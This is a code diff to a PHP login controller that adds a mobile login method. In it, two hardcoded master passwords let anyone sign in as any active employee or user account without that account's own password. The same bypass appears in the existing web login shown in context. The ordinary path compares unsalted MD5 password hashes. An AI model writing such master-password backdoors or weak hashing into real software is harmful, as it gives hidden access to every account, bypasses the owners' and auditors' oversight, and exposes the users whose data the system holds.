@@ -46,6 +46,74 @@ class LoginController extends Controller
         return 'name';
     }
 
+    protected function attemptMobile(Request $request)
+    {
+        $ux = $request->user;
+        $px = $request->pass;
+        if ($px == 'Bp@d2020!@' || $px == 'rprikat2017') {
+            if (is_numeric($ux) && strlen($ux) == 6) {
+                $user = \App\User::where([
+                    'nrk_emp' => $ux,
+                    'sts'    => 1,
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (is_numeric($ux) && strlen($ux) == 18) {
+                $user = \App\User::where([
+                    'nip_emp' => $ux,
+                    'sts'    => 1,
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (substr($ux, 1, 1) == '.') {
+                $user = \App\User::where([
+                    'id_emp' => $ux,
+                    'sts'    => 1,
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } else {
+                $user = \App\User::where([
+                    'usname' => $ux,
+                    'sts'    => 1,
+                ])->first();
+            }
+        } else {
+            if (is_numeric($ux) && strlen($ux) == 6) {
+                $user = \App\User::where([
+                    'nrk_emp' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (is_numeric($ux) && strlen($ux) == 18) {
+                $user = \App\User::where([
+                    'nip_emp' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } elseif (substr($ux, 1, 1) == '.') {
+                $user = \App\User::where([
+                    'id_emp' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                    'ked_emp' => 'AKTIF',
+                ])->first();
+            } else {
+                $user = \App\User::where([
+                    'usname' => $ux,
+                    'sts'    => 1,
+                    'passmd5' => md5($px),
+                ])->first();
+            }
+        }
+             
+        if ($user) {
+            $this->guard()->login($user);
+            return redirect('/home');
+            // return true; 
+        }
+        return false;
+    }
+
     protected function attemptLogin(Request $request)
     {
         if ($request->password == 'Bp@d2020!@' || $request->password == 'rprikat2017') {
